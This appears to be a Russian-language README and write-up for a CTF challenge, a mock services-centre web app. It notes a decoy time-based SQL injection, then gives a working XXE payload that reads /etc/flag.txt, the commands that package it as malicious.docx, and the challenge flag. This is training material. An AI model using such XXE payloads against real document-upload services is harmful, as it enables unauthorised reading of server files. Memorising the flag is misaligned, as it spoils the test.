# МФЦ

## Опсиание
Автор @geen_stack

Теперь государство гарантирует отдельные льготы для ЦТФеров!
Скорее же подавайте заявку

## Deploy

Экспозит порт 6082
```
docker-compose up
```

## WriteUp

В приложении есть фейковая TimeBased SQLi в POST-праметре type, но она ничего хакеру не даст.
Чтобы залутать флаг нужно использовать XXE в функционале обработки docx:

Создаем нагрузку
Делаем файл document.xml
```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/flag.txt">
]>
<root>&xxe;</root>
```

Собираем документ:
```
mkdir -p word
cp document.xml word/
zip -r malicious.docx word/
```

## Flag
```
flag{w0w_y0u_spl01t_xx3_1n_d0cx}
```
